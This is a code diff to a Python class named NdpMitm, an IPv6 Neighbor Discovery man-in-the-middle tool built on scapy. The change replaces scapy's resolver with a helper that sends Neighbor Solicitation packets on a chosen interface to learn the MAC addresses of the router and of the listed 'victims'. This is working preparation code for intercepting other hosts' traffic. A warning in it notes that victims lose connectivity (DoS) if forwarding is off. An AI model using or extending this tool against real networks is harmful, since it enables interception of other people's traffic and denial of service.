@@ -109,7 +109,6 @@ class NdpMitm:
     # ---- live glue (needs root/network) ------------------------------------
     def prepare(self) -> bool:  # pragma: no cover
         from scapy.all import get_if_hwaddr
-        from scapy.layers.inet6 import getmacbyip6
 
         self.our_mac = get_if_hwaddr(self.iface)
         if self.router is None:
@@ -119,18 +118,12 @@ class NdpMitm:
         if not self.router:
             self.warnings.append("no IPv6 default router found — set it manually")
             return False
-        try:
-            self.router_mac = getmacbyip6(self.router)
-        except Exception:
-            self.router_mac = None
+        self.router_mac = self._resolve6(self.router)
         if not self.router_mac:
             self.warnings.append(f"could not resolve router {self.router} MAC")
             return False
         for v in self.victims:
-            try:
-                mac = getmacbyip6(v)
-            except Exception:
-                mac = None
+            mac = self._resolve6(v)
             if mac:
                 self.victim_macs[v] = mac
             else:
@@ -145,6 +138,40 @@ class NdpMitm:
                 self.warnings.append("IPv6 forwarding is OFF — victims lose connectivity "
                                      "(DoS). Run as root.")
         return True
+
+    def _resolve6(self, ip6: str) -> str | None:  # pragma: no cover
+        """Resolve an on-link IPv6 address to a MAC via a Neighbor Solicitation
+        sent explicitly on our interface (robust on multi-NIC hosts, unlike
+        scapy's route-guessing getmacbyip6)."""
+        from socket import AF_INET6, inet_ntop, inet_pton
+
+        from scapy.layers.inet6 import (
+            ICMPv6ND_NA,
+            ICMPv6ND_NS,
+            ICMPv6NDOptSrcLLAddr,
+            IPv6,
+            in6_getnsma,
+            in6_getnsmac,
+        )
+        from scapy.layers.l2 import Ether
+        from scapy.sendrecv import srp1
+
+        try:
+            nsma = in6_getnsma(inet_pton(AF_INET6, ip6))
+            dst6, dmac = inet_ntop(AF_INET6, nsma), in6_getnsmac(nsma)
+            ns = (Ether(src=self.our_mac, dst=dmac) / IPv6(dst=dst6)
+                  / ICMPv6ND_NS(tgt=ip6) / ICMPv6NDOptSrcLLAddr(lladdr=self.our_mac))
+            ans = srp1(ns, iface=self.iface, timeout=2, verbose=False)
+            if ans is not None and ans.haslayer(ICMPv6ND_NA):
+                return ans[Ether].src
+        except Exception:
+            pass
+        # fall back to scapy's own resolver
+        try:
+            from scapy.layers.inet6 import getmacbyip6
+            return getmacbyip6(ip6)
+        except Exception:
+            return None
 
     def start(self) -> bool:  # pragma: no cover
         if not self.prepare():
